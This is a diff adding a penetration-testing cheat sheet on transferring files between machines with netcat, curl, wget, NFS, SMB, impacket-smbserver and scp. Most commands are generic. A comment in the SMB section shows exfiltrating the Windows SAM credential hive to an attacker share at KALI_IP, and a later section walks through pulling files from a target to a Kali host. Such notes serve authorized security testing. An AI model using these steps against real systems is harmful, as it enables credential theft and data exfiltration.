@@ -1,0 +1,109 @@
+# Linux File Transfers
+
+## Netcat
+
+##### start listener on target
+```sh
+nc -nlvp [PORT] > [RECIVING_FILE]
+```
+##### send the file
+```
+nc [IP] [PORT] < [SENDING_FILE]
+```
+
+
+## Start Python Webserver
+```
+python3 -m http.server [PORT]
+```
+
+##### Curl
+
+```sh
+curl -F "upload=@[FILE]" https://[IP]/[FILE]
+```
+
+```
+curl -o [FILE] https://[IP]/[FILE]
+```
+
+##### Wget
+```
+wget [IP]:[PORT]/[FILE]
+```
+
+## NFS Shares
+
+```sh
+sudo mkdir -p /mnt/[SHARE]
+```
+```sh
+mount -t nfs -o vers=3 [IP]:/[FOLDER]/ /mnt/[SHARE]
+```
+```sh
+sudo mkdir -p /mnt/[SHARE]
+```
+```sh
+mount -t nfs -o vers=2 [REMOTE_IP]:/[FOLDER]/ /mnt/[SHARE]
+```
+##### Unmount
+```sh
+sudo umount /mnt/[SHARE]
+```
+##### Mount at Boot
+```sh
+[IP]:/[SHARE]/[FOLDER]  /mnt/[SHARE]  nfs  defaults,vers=3  0  0
+```
+
+## SMB Shares
+
+##### Mount SMB Share
+```sh
+sudo mount -t cifs -o vers=1.0 //[REMOTE_IP]/'[SHARE]' /mnt/[SHARE]
+```
+##### Host SMB Share
+```sh
+sudo impacket-smbserver [SHARE] .
+# to use for exfil: copy C:\Windows\Repair\SAM \\KALI_IP\share\sam.save
+```
+##### Upload from Target
+```
+copy C:\Path\To\[FILE] \\[IP]\[SHARE]\[FILE]
+```
+##### Upload with curl to Target
+```sh
+curl --upload-file /Path/To/[FILE] -u 'DOMAIN\[USER]' smb://[IP]/[SHARE]/
+```
+##### Use smbclient to Get ALL files from an SMB share
+```sh
+smbclient //[IP]/[SHARE]
+RECURSE ON
+PROMPT OFF
+mget *
+```
+
+### SCP
+##### Copy TO Remote Machine
+```sh
+scp /[LOCAL_PATH]/[FILE] [USER]@[IP]:/[REMOTE_PATH]/[FILE]
+```
+
+##### Copy FROM Remote Machine
+```sh
+scp [USER]@[IP]:/[REMOTE_PATH]/[FILE] /[LOCAL_PATH]/[FILE]
+```
+
+### From Windows to local Kali machine using impacket-smbserver
+On local Kali machine:
+```
+sudo impacket-smbserver ShareName $(pwd)
+```
+Connect to newly created Share from Remote Windows target:
+```
+net use \\$LHOST\ShareName
+```
+Once connected to Share
+```
+copy $FILEPATH\file \\$LOST\ShareName
+```
+File should be copied from remote Windows target to local Kali machine at $(pwd)
